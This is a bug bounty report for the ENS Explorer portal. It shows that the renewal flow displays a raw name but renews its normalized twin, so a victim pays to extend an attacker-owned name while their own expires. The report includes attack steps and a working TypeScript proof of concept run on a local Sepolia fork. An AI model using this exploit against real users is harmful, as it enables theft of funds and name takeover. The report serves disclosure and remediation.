# 91830 w a critical explorer renews a different ens name than it displays the victim pays to extend an attacker s name while their own expires

**Submitted on Sep 4th 2026 at 16:02:29 UTC by @Dead\_Aizen for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91830
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user funds
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Explorer's renewal flow gates and displays on the **raw** name a user selected, but builds the renewal transaction — and quotes its price — from the **normalized** form of that name. `Foo.eth` and `foo.eth` are distinct registry entries (`LibLabel.id(label) = keccak256(bytes(label))`, with no normalization in `ETHRegistrar.register`), so a user renewing `Foo.eth` renews `foo.eth` instead.

`AbstractETHRegistrar.renew` is `external`, performs **no ownership check**, and debits `msg.sender`. Renewing a name you do not own therefore *succeeds*. An attacker who registers the normalized twin of a victim's name is paid by the victim on every renewal attempt, while the victim's own name is never extended and eventually expires.

Demonstrated on-chain: the victim was debited 8.000021 USDC and the attacker's name gained exactly the year the victim selected, with the victim's expiry unchanged.

**Asset:** `apps/portal` (Explorer) **Revision:** `63772fd872af472ced58b009499355f3430c2a86` (program-stated audited revision; squashed as `cda79ac` in the Immunefi fork) **Impacts:** Direct theft of user funds · Causing the application to display an incorrect name or transaction detail on a transaction the user approves — **Critical**

## Root cause

`apps/portal/src/features/renew/hooks/useRenewalTransactions.ts`

```ts
function buildRenewIntent(params: RenewParams): CustomTransactionIntent {
  // ensjs splits the label without normalizing, so pass a normalized 2LD name.
  const writeParams = renewNameWriteParameters(params.publicClient, {
    name: `${getLabel(params.name)}.eth`,          // L197 — the name that is renewed
    duration: BigInt(params.duration),
    paymentToken: params.tokenAddress,
    referrer: REFERER_ADDRESS,
    contract: params.isV2 ? 'ensEthRegistrar' : 'ensEthRenewerV1',
  })
  ...
}

function buildRenewTransaction(params: RenewParams, signer: Signer) {
  transactionManager.startTransaction(buildRenewIntent(params), signer, {
    description: `Renew ${params.name}`,           // L221 — what the user approves
  })
}
```

The inline comment shows the normalization was deliberate — added to satisfy ensjs's label splitting — but it is applied to the value that determines *which name is paid for*, not merely to a display string.

The split runs through the whole flow:

| Uses the **raw** name                                | Uses the **normalized twin**                                                          |
| ---------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `isExtendable2LD` — 2LD syntax, expiry, grace window | `getRenewalPrice` → `resolvePriceInputs` → `getLabel` (`useRegistrationPrice.ts` L54) |
| the expiry and status shown on the page              | `buildRenewIntent` → `renew(getLabel(name))`                                          |
| `description: \`Renew ${params.name}\`\`             |                                                                                       |

**It fails open.** `useCanExtend` (L67):

```ts
const canExtend = isExtendable2LD(selectedName) && (isV2 || isRenewable(name))
```

For a v2 name `isV2` short-circuits the `||`, so the on-chain `isRenewable` read is skipped entirely and nothing validates the twin before signing. The hook's own docblock states the intent:

> *"v2 relies solely on the client-side window (`isExtendable2LD`) — the v2 registrar renews throughout registered + grace."*

`expirySeconds` in the same hook comes from `getV2RegistrationDataQueryOptions({ name })` — the **raw** name — so the gate reads the displayed name's expiry while the transaction renews the twin. (`useIsRenewable` would have queried the twin as well; it derives its label with `getLabel(name)` too.)

Because ENS renewal is permissionless by design, there is no ownership check anywhere in this path that could catch the divergence — which is why it fails open where the transfer path fails closed.

**The contract permits it.** `AbstractETHRegistrar.renew`:

```solidity
function renew(string calldata label, uint64 duration, IERC20 paymentToken, bytes32 referrer)
    external
{
    IPermissionedRegistry.State memory state = _requireRenewable(label, duration);
    uint64 newExpiry = state.expiry + duration;
    uint256 amount = rentPriceOracle.getRenewPrice(label, state.expiry, duration, paymentToken);
    SafeERC20.safeTransferFrom(paymentToken, msg.sender, BENEFICIARY, amount);   // charges the CALLER
    ETH_REGISTRY.renew(state.tokenId, newExpiry);
    ...
}
```

No ownership requirement — only that the label is renewable.

## No privileged role is required

| Step                         | Function                           | Access control                                                           |
| ---------------------------- | ---------------------------------- | ------------------------------------------------------------------------ |
| Fund attacker                | `MockERC20.mint`                   | none — public faucet helper on the Sepolia test USDC                     |
| Register the twin            | `ETHRegistrar.commit` / `register` | none — both `external`; needs a commitment, availability, ERC-20 payment |
| Collect the victim's payment | `AbstractETHRegistrar.renew`       | none — no ownership check; debits `msg.sender`                           |

## Attack

1. Attacker registers `foo.eth`, the normalized twin of a victim's `Foo.eth`. Both apps' own forms reject unnormalized labels; the contracts do not, so the victim's `Foo.eth` must have been registered directly — as, for example, an unsolicited gift from the attacker.
2. The victim opens `Foo.eth` in the Explorer. The page shows `Foo.eth`'s own expiry and grace status, and offers Extend.
3. The quoted price is `foo.eth`'s.
4. The victim approves a transaction described as `Renew Foo.eth`.
5. `renew("foo", …)` executes: the victim is debited, **the attacker's name is extended**, and `Foo.eth` is untouched.
6. Repeatable. The victim's name continues toward expiry; once it lapses the attacker can register it.

## Proof of concept

A vitest test in `apps/portal`. The renewal transaction is built by the four lines of `buildRenewIntent` copied verbatim, using the app's own `getLabel`, the app's own `sepoliaWithEns` chain config, and the same `renewNameWriteParameters` from `@ensdomains/ensjs/wallet` the app calls. Nothing is re-implemented or stubbed; commitments come from the registrar's own `makeCommitment`.

```bash
anvil --fork-url <SEPOLIA_RPC> --chain-id 11155111 --port 8545
pnpm vitest run src/poc-renew-divergence.test.ts     # from apps/portal
```

Contracts are those the shipped app resolves through ensjs (`ensL1Contracts[sepolia]`): registry `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, registrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, payment token `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`.

Result:

```
 ✓ src/poc-renew-divergence.test.ts (1 test) 35455ms
   ✓ renews a different name than the UI and wallet prompt display

displayed  : ZQXren0042.eth  expiry 1820054421 -> 1820054421   (UNCHANGED)
renewed    : zqxren0042.eth  expiry 1820054321 -> 1851590321   (attacker-owned)
victim paid: 8000021 USDC units
```

`1851590321 − 1820054321 = 31,536,000` — exactly the one-year duration the victim selected, applied to the attacker's name. The victim's own expiry did not move.

The test asserts all three: the displayed name's expiry is unchanged, the twin's expiry increased, and the victim's USDC balance decreased.

## Limitations

1. The victim must hold a name whose registered label is not normalized. Both apps reject unnormalized labels at registration, so it must be created by a direct contract call — which is permissionless, as the PoC's registration steps show. The natural delivery is an unsolicited transfer from the attacker (`PermissionedRegistry._update` checks the sender's role only, never the recipient's consent).
2. Requires the victim to initiate a renewal.
3. Demonstrated on a Sepolia fork, driving `buildRenewIntent` directly rather than through the browser.

## Fix

Build the renewal from the label **as registered**, not from `getLabel(name)`. The same correction applies to the price path (`resolvePriceInputs`) and to `useIsRenewable`, so that the gate, the quote, and the transaction all refer to the name being displayed. Removing the `isV2 ||` short-circuit in `useCanExtend` would additionally restore an on-chain check on the v2 path.

## Proof of Concept

```ts
import { renewNameWriteParameters } from '@ensdomains/ensjs/wallet'
import { createPublicClient, createWalletClient, encodeFunctionData, http,
         keccak256, labelhash, toBytes, zeroAddress, zeroHash, type Address } from 'viem'
import { sepolia } from 'viem/chains'
import { expect, it } from 'vitest'
import { sepoliaWithEns } from '@/lib/wagmi'          // the app's own chain config
import { getLabel } from '@/utils/token/getLabel'      // the app's own function

const RPC = 'http://127.0.0.1:8545'
const REGISTRY  = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address
const REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc' as Address
const USDC      = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39' as Address
const ATTACKER  = '0xa11ce00000000000000000000000000000000011' as Address
const VICTIM    = '0xb0b0000000000000000000000000000000000012' as Address

const RAW = 'ZQXren0042'
const DISPLAYED = `${RAW}.eth`
const DURATION = 31536000n
const REFERER_ADDRESS = zeroHash

const regAbi = [
  { name:'getState', type:'function', stateMutability:'view',
    inputs:[{name:'labelId',type:'uint256'}],
    outputs:[{ type:'tuple', components:[
      {name:'status',type:'uint8'},{name:'expiry',type:'uint64'},
      {name:'latestOwner',type:'address'},{name:'tokenId',type:'uint256'},
      {name:'resource',type:'uint256'} ]}] },
] as const
const rarAbi = [
  { name:'commit', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'c',type:'bytes32'}], outputs:[] },
  { name:'register', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'label',type:'string'},{name:'owner',type:'address'},{name:'secret',type:'bytes32'},
            {name:'subregistry',type:'address'},{name:'resolver',type:'address'},{name:'duration',type:'uint64'},
            {name:'paymentToken',type:'address'},{name:'referrer',type:'bytes32'}], outputs:[{type:'uint256'}] },
  { name:'MIN_COMMITMENT_AGE', type:'function', stateMutability:'view',
    inputs:[], outputs:[{type:'uint64'}] },
  { name:'makeCommitment', type:'function', stateMutability:'pure',
    inputs:[{name:'label',type:'string'},{name:'owner',type:'address'},{name:'secret',type:'bytes32'},
            {name:'subregistry',type:'address'},{name:'resolver',type:'address'},{name:'duration',type:'uint64'},
            {name:'referrer',type:'bytes32'}], outputs:[{type:'bytes32'}] },
] as const
const tokAbi = [
  { name:'mint', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'to',type:'address'},{name:'amt',type:'uint256'}], outputs:[] },
  { name:'approve', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'s',type:'address'},{name:'a',type:'uint256'}], outputs:[{type:'bool'}] },
  { name:'balanceOf', type:'function', stateMutability:'view',
    inputs:[{name:'a',type:'address'}], outputs:[{type:'uint256'}] },
] as const

const pub = createPublicClient({ chain: sepolia, transport: http(RPC) })
const ensClient = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })
const wal = (a: Address) => createWalletClient({ account: a, chain: sepolia, transport: http(RPC) })
const rpc = (m: string, p: unknown[]) => fetch(RPC, {
  method:'POST', headers:{'content-type':'application/json'},
  body: JSON.stringify({ jsonrpc:'2.0', id:1, method:m, params:p }) }).then(r => r.json())

const expiryOf = async (label: string) => {
  const s = await pub.readContract({ address:REGISTRY, abi:regAbi, functionName:'getState',
    args:[BigInt(labelhash(label))] }) as { expiry: bigint }
  return s.expiry
}
const usdcOf = (a: Address) => pub.readContract({
  address: USDC, abi: tokAbi, functionName: 'balanceOf', args: [a] }) as Promise<bigint>
const sent = async (hash: `0x${string}`, what: string) => {
  const r = await pub.waitForTransactionReceipt({ hash })
  expect(r.status, what).toBe('success')
}

async function registerName(label: string, owner: Address, minAge: bigint) {
  const w = wal(owner)
  await sent(await w.writeContract({ address:USDC, abi:tokAbi, functionName:'mint',
    args:[owner, 10n ** 12n] }), `mint ${label}`)
  await sent(await w.writeContract({ address:USDC, abi:tokAbi, functionName:'approve',
    args:[REGISTRAR, 10n ** 12n] }), `approve ${label}`)
  const secret = keccak256(toBytes(`${label}:renewpoc`))
  const commitment = await pub.readContract({ address:REGISTRAR, abi:rarAbi,
    functionName:'makeCommitment',
    args:[label, owner, secret, zeroAddress, zeroAddress, DURATION, zeroHash] }) as `0x${string}`
  await sent(await w.writeContract({ address:REGISTRAR, abi:rarAbi, functionName:'commit',
    args:[commitment] }), `commit ${label}`)
  await rpc('evm_increaseTime', [Number(minAge) + 30])
  await rpc('evm_mine', [])
  await sent(await w.writeContract({ address:REGISTRAR, abi:rarAbi, functionName:'register',
    args:[label, owner, secret, zeroAddress, zeroAddress, DURATION, USDC, zeroHash] }),
    `register ${label}`)
}

it('renews a different name than the UI and wallet prompt display', async () => {
  const normalized = getLabel(DISPLAYED)              // app's own function -> 'zqxren0042'
  expect(normalized).not.toBe(RAW)

  for (const a of [ATTACKER, VICTIM]) {
    await rpc('anvil_impersonateAccount', [a])
    await rpc('anvil_setBalance', [a, '0x21e19e0c9bab2400000'])
  }
  const minAge = await pub.readContract({ address:REGISTRAR, abi:rarAbi,
    functionName:'MIN_COMMITMENT_AGE' }) as bigint

  await registerName(normalized, ATTACKER, minAge)    // attacker owns the normalized twin
  await registerName(RAW, VICTIM, minAge)             // victim owns the name they see

  const beforeRaw = await expiryOf(RAW)
  const beforeNorm = await expiryOf(normalized)
  const beforeBal = await usdcOf(VICTIM)

  // ---- buildRenewIntent, useRenewalTransactions.ts L190-207, verbatim ----
  const writeParams = renewNameWriteParameters(ensClient as never, {
    name: `${getLabel(DISPLAYED)}.eth`,
    duration: DURATION,
    paymentToken: USDC,
    referrer: REFERER_ADDRESS,
    contract: 'ensEthRegistrar',
  })
  const renewData = encodeFunctionData({
    abi: writeParams.abi, functionName: writeParams.functionName, args: writeParams.args,
  } as Parameters<typeof encodeFunctionData>[0])
  // -----------------------------------------------------------------------

  // the victim approves a transaction described as `Renew ${DISPLAYED}` (L221)
  await sent(await wal(VICTIM).sendTransaction({
    to: writeParams.address, data: renewData }), `renew "${DISPLAYED}"`)

  const afterRaw = await expiryOf(RAW)
  const afterNorm = await expiryOf(normalized)
  const afterBal = await usdcOf(VICTIM)

  expect(afterRaw).toBe(beforeRaw)                    // the name shown: NOT renewed
  expect(afterNorm).toBeGreaterThan(beforeNorm)       // the attacker's name: renewed
  expect(afterBal).toBeLessThan(beforeBal)            // paid for by the victim

  console.info('displayed :', DISPLAYED, 'expiry', beforeRaw, '->', afterRaw, '(UNCHANGED)')
  console.info('renewed   :', `${normalized}.eth`, 'expiry', beforeNorm, '->', afterNorm)
  console.info('victim paid:', beforeBal - afterBal, 'USDC units')
}, 180_000)
```
